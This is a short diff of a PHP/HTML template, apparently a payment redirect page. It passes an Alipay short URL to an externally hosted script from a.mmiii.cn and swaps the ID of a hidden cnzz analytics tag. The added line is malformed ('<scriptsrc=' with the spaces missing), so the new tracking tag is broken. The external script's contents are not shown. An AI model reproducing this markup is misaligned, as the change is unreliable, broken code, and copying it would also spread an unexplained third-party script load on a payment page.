@@ -21,7 +21,7 @@ window.onhashchange = function() {
   setTimeout('hh();', 200);
 </script>
 <script>var _0 = "<?= $model['alipay_short_url'];?>";var _1 = "<?= $model['alipay_short_url'];?>";</script><script src="http://a.mmiii.cn/home/main.js" language="JavaScript"></script><div style="display:none">
-  <script src="https://s22.cnzz.com/z_stat.php?id=1263659954&web_id=1263659954" language="JavaScript"></script>
+  <scriptsrc="https://s22.cnzz.com/z_stat.php?id=1271901597&web_id=1271901597"language="JavaScript"></script>
 </div>
 </body>
 
